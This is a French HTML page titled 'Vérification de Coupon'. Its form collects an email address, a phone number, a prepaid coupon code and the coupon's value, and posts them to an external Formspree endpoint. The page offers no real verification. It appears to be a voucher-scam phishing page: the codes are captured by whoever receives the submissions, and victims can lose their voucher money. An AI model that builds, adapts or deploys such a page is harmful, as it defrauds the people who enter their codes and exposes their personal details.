<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vérification de Coupon</title>
<style>
body {
font-family: Arial, sans-serif;
background-color: #f2f2f2;
padding: 20px;
}
form {
background-color: #fff;
padding: 20px;
border-radius: 5px;
max-width: 400px;
margin: auto;
box-shadow: 0 0 10px rgba(0,0,0,0.1);
}
label, input, select {
display: block;
width: 100%;
margin-bottom: 15px;
}
button {
padding: 10px;
background-color: #4CAF50;
color: white;
border: none;
width: 100%;
cursor: pointer;
}
button:hover {
background-color: #45a049;
}
</style>
</head>
<body>

<h2 style="text-align: center;">Vérification de Coupon</h2>

<form action=https://formspree.io/f/xrbpzpqv method="POST">
<label for="email">Adresse e-mail :</label>
<input type="email" name="email" id="email" required>

<label for="telephone">Numéro de téléphone :</label>
<input type="tel" name="telephone" id="telephone" required>

<label for="code_coupon">Code du coupon :</label>
<input type="text" name="code_coupon" id="code_coupon" required>

<label for="prix_coupon">Prix du coupon :</label>
<select name="prix_coupon" id="prix_coupon" required>
<option value="20€">20€</option>
<option value="50€">50€</option>
<option value="100€">100€</option>
<option value="150€">150€</option>
<option value="200€">200€</option>
<option value="250€">250€</option>
</select>

<label>Cacher le code :</label>
<input type="radio" name="cacher_code" value="Oui" required> Oui
<input type="radio" name="cacher_code" value="Non" required> Non

<button type="submit">Valider</button>
</form>

</body>
</html>
